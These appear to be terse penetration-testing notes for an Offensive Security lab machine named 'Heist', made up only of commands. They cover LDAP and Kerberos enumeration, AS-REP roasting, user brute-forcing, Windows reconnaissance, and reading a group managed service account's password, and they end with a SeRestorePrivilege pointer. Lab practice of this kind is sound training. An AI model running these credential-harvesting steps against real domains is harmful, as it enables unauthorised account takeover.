
```
ldapsearch -x -h TARGET -b "dc=heist,dc=offsec"
```

```
GetNPUsers.py heist.offsec/ -dc-ip TARGET
```

```
kerbrute -domain heist.offsec -users /usr/share/wordlists/names.txt -dc-ip TARGET

```

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"

```

```
net user enox

```

. .\PowerView.ps1
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq “msDS-GroupManagedServiceAccount”}
```

```
.\GMSAPasswordReader.exe --AccountName ‘svc_apache’
```

```
SeRestorePrivilege
```

